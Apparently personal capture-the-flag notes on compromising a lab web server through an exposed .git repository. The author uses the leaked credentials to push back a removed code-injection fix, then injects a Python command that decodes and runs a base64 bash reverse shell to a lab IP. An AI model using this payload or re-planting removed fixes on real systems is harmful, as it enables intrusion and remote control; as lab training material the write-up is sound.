open ports
80 Apache httpd 2.4.29 ((Ubuntu))
![[Pasted image 20221124150226.png]]

5000 Werkzeug httpd 1.0.1 (Python 2.7.17)
found exploit for Werkzeug but didn't work 

![[Pasted image 20221124150207.png]]
8000
![[Pasted image 20221124150240.png]]
running gobuster on each of them found .git at port 8000

running gobuster again on port 8000 found 3 files
![[Pasted image 20221124150321.png]]

![[Pasted image 20221124150351.png]]
![[Pasted image 20221124150400.png]]
looks like we found a repo and the username/password for it
downloading the repo 
```bash
git clone http://online-calc.com/projects/online-calc
```

found 2 .py files

![[Pasted image 20221124151102.png]]
and it's' the service running on port 8000 werkzeug



checking for commit logs 
```
git log
```

![[Pasted image 20221124150611.png]]

checking how the exploit got fixed
```
git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd
```
![[Pasted image 20221124150705.png]]
![[Pasted image 20221124150718.png]]
We can now comment out the fix and put it back to the server with the creds we found earlier 
![[Pasted image 20221124151156.png]]
![[Pasted image 20221124151717.png]]
now we added a new commit and pushed it to the server 
and we can run python commands into the calculator at port 500
```python
__import__('os').system('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTI4LjEzNy4yLzQ0NDQgMD4mMSIK| base64 -d | bash')
```
![[Pasted image 20221207044627.png]]

and we have a shell 
![[Pasted image 20221207044641.png]]
